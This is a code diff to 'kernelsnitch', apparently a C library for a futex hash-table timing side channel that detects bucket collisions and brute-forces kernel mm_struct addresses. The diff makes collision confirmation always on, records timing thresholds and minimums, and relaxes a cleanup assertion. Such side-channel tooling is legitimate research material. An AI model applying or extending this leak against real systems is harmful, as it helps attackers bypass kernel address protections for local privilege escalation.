@@ -60,6 +60,11 @@ struct kernelsnitch_shared_state {
     size_t appended_futexes;
     size_t repeat_measurement;
     size_t average;
+    size_t collision_confirmations;
+    size_t collision_baseline;
+    size_t collision_threshold;
+    size_t collision_min_time;
+    size_t confirmed_collisions;
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -161,6 +166,9 @@ static void __decrease(struct kernelsnitch_shared_state *ks)
 #endif
 #ifndef AVERAGE
 #define AVERAGE (1<<3)
+#endif
+#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #endif
 static int __compare(const void *a, const void *b)
 {
@@ -303,6 +311,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->appended_futexes = APPENDED_FUTEXES;
     ks->repeat_measurement = REPEAT_MEASUREMENT;
     ks->average = AVERAGE;
+    ks->collision_confirmations = KERNELSNITCH_COLLISION_CONFIRMATIONS;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
@@ -391,11 +400,6 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
-#endif
-#endif
     size_t count = 0;
     size_t wanted;
     size_t futex_addr;
@@ -407,6 +411,10 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     size_t approx_time = MIN(
         __measure(ks, (size_t)&ks->futexes[0]),
         __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    ks->collision_baseline = approx_time;
+    ks->collision_threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
+    ks->collision_min_time = (size_t)-1;
+    ks->confirmed_collisions = 0;
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -422,26 +430,30 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+        if (ks->times[i] > ks->collision_threshold) {
             int confirmed = 1;
+            size_t min_time = ks->times[i];
             for (size_t confirmation = 1;
-                 confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
+                 confirmation < ks->collision_confirmations;
                  ++confirmation) {
-                if (__measure(ks, futex_addr) <=
-                    (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+                size_t confirmation_time = __measure(ks, futex_addr);
+                if (confirmation_time < min_time)
+                    min_time = confirmation_time;
+                if (confirmation_time <= ks->collision_threshold) {
                     confirmed = 0;
                     break;
                 }
             }
             if (!confirmed)
                 continue;
-#endif
             count++;
+            if (min_time < ks->collision_min_time)
+                ks->collision_min_time = min_time;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
     }
+    ks->confirmed_collisions = count;
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
@@ -513,7 +525,9 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
  */
 size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 {
-    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
+    /* Fail-closed callers may discard an initialized or collision-only
+     * oracle before bruteforce. Cleanup must not turn that safe abort into
+     * a userspace assertion failure. */
     munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
     ks->times = 0;
     munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
